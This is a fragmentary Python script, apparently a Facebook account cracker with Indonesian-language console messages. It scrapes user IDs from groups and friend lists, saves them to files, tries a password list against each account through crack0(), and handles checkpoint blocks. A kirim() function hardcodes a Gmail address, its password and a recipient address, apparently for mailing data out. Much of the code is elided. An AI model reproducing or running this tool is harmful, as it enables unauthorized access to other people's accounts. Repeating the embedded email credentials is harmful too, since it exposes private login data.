...
try:
	...
	tampil('\rm[!]SepertiNya Module \rcmechanize\rm belum di install ey...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm[!]Keluar')
...
def inputD(x,v=0):
	while 1:
		...
		if v:
			...
			if len(a) == 0:
				tampil('\rm[!]Masukan dengan benar eak')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			...
			tampil('\rm[!]Pilihan tidak ada gblk')
			continue
		if i in d:
			break
		else:
			tampil('\rm[!]Pilihan tidak gblk')
	return i
def kirim():
   email_user = 'aldysanjaya024@gmail.com'
   email_password = '(i24122002u")'
   email_send = 'ibnusyawal24@gmail.com'
...
def simpan():
	if len(id_bgroup) != 0:
		...
		try:
			...
			tampil('\rh[!]Berhasil meyimpan \rcMBfgroup.txt')
		except:
	...
	if len(id_bteman) != 0:
		...
		try:
			...
			tampil('\rh[!]Berhasil meyimpan \rcMBfteman.txt')
		except:
			tampil('\rm[!]Gagal meyimpan njir..')
def buka(d):
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini/chrome/ucNews eak')
		keluar()
	else:
		tampil('\rm[!]Login Gagal eyy')
...
def saring_id_group0():
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]Id yang lu masukan salah asw')
			continue
	...
	if i.upper() == 'P':
		while 1:
			...
			try:
				...
				continue
			break
		tampil('\rh[*]Memulai eue dengan \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi gk cok? (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
...
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Riset Hasil Id Group/lanjutkan (y/t)',['Y','T'])
		if i.upper() == 'Y':
...
# \rhGitHub\rp                  https://github.com/malingbabyk  \rk#
